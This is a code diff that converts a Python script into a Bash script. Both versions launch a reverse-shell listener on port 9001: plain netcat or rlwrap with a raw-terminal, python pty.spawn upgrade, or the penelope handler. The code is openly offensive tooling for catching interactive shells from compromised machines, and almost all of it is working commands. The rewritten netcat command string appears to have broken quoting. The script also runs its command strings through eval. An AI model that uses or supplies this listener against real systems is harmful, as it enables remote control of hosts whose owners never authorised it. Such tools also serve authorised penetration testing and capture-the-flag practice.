@@ -1,37 +1,36 @@
-#!/usr/bin/env python3
-import subprocess
-import argparse
-import shutil
+#!/bin/bash --noediting
+# set default values
+PORT=9001
+FORCE_OLD=false
 
-parser = argparse.ArgumentParser(description='Listen for executables and run them')
-parser.add_argument('-p', '--port', type=int, default=9001, help='Port to listen on')
-parser.add_argument('-f', '--force-old', action='store_true', help='Force old version of listener using nc instead of penelope')
-# if -f is passed, force old version of listener using nc instead of penelope
+# parse arguments
+while getopts ":p:f" opt; do
+    case $opt in
+    p) PORT=$OPTARG ;;
+    f) FORCE_OLD=true ;;
+    \?) echo "Invalid option -$OPTARG" >&2 ;;
+    esac
+done
 
-args = parser.parse_args()
+nc_command="stty raw -echo; (echo export TERM=xterm;echo 'python3 -c \"import pty;pty.spawn(\\\"/bin/bash\\\")\"' || python3 -c \"import pty;pty.spawn(/bin/bash)\"' ;echo 'stty $(stty -a | awk -F ';' '{print $2 $3}' | head -n 1)'; echo reset;cat) | rlwrap \\nc -lvnp $PORT && reset"
 
-nc_command = '''stty raw -echo; (echo export TERM=xterm;echo 'python3 -c "import pty;pty.spawn(\"/bin/bash\")" || python3 -c "import pty;pty.spawn(\\"/bin/bash\\")"' ;echo "stty$(stty -a | awk -F ';' '{print $2 $3}' | head -n 1)"; echo reset;cat) | rlwrap \\nc -lvnp $port && reset'''
+rlwrap_command='stty raw -echo; (echo export TERM=xterm; echo '\''python3 -c "import pty;pty.spawn(\\\"/bin/bash\\\")"'\'' || echo '\''python3 -c "import pty;pty.spawn(\\\\\\"/bin/bash\\\\\\")"'\''; echo '\''stty$(stty -a | awk -F ";" '\''{print $2 $3}'\'' | head -n 1)'\''; echo reset; cat) | rlwrap nc -lvnp '"$PORT"' && reset'
 
-rlwrap_command = '''stty raw -echo; (echo export TERM=xterm;echo 'python3 -c "import pty;pty.spawn(\"/bin/bash\")" || python3 -c "import pty;pty.spawn(\\"/bin/bash\\")"' ;echo "stty$(stty -a | awk -F ';' '{print $2 $3}' | head -n 1)"; echo reset;cat) | rlwrap \\nc -lvnp $port && reset'''
-
-penelope_command = '''penelope $port'''
+penelope_command="penelope $PORT"
 
 # check if rlwrap exists and if so use it
-rlwrap_exists = True if shutil.which('rlwrap') else False
-penelope_exists = True if shutil.which('penelope') else False
+rlwrap_exists=$(command -v rlwrap >/dev/null && echo true || echo false)
+penelope_exists=$(command -v penelope >/dev/null && echo true || echo false)
 
-# print(f"args.force_old: {args.force_old}")
-
-if args.force_old or not penelope_exists:
-    if rlwrap_exists:
-        print('Using rlwrap')
-        p = subprocess.Popen(rlwrap_command.replace('$port', str(args.port)), shell=True)
-        p.wait()
-    else:
-        print('Using plain nc')
-        p = subprocess.Popen(nc_command.replace('$port', str(args.port)), shell=True)
-        p.wait()
-else:
-    print('Using penelope')
-    p = subprocess.Popen(penelope_command.replace('$port', str(args.port)), shell=True)
-    p.wait()
+if [ "$FORCE_OLD" = true ] || [ "$penelope_exists" = false ]; then
+    if [ "$rlwrap_exists" = true ]; then
+        echo 'Using rlwrap'
+        eval "$rlwrap_command"
+    else
+        echo 'Using plain nc'
+        eval "$nc_command"
+    fi
+else
+    echo 'Using penelope'
+    eval "$penelope_command"
+fi
